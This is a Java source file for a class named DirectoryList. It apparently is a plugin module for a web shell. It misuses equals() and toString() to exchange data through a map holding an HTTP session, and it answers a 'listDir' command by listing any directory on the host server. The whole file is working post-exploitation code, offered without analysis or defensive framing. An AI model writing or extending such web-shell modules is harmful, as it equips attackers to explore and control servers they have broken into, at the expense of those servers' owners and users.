import java.io.File;
import java.util.HashMap;

public class DirectoryList {
    private HashMap parameterMap;
    public static Object Session;

    public DirectoryList() {
    }

    public boolean equals(Object paramObject) {
        try {
            this.parameterMap = (HashMap) paramObject;
            this.Session = this.parameterMap.get("httpSession");
        } catch (Exception e) {
            return false;
        }
        return true;
    }

    public String toString() {
        this.parameterMap.put("result", this.run().getBytes());
        this.parameterMap = null;
        return null;
    }

    public String run() {
        String methodName = this.get("methodName");
        try {
            if (methodName == null) {
                return "error:methodName is null";
            }

            if (methodName.equals("listDir")) {
                String path = this.get("path");
                return "ok:" + this.listDir(path);
            }

            return "error:methodName is not found";
        } catch (Exception e) {
            return "error:" + e.getMessage();
        }
    }

    public String listDir(String path) {
        if (path == null) {
            return "error:path is null";
        }
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            return "error:path is not a directory";
        }
        File[] files = dir.listFiles();
        if (files == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < files.length; i++) {
            sb.append(files[i].getName());
            if (i < files.length - 1) {
                sb.append("\n");
            }
        }
        return sb.toString();
    }

    public String get(String key) {
        Object value = this.parameterMap.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        if (value instanceof byte[]) {
            try {
                return new String((byte[]) value, "UTF-8");
            } catch (Exception e) {
                return null;
            }
        }
        return value.toString();
    }
}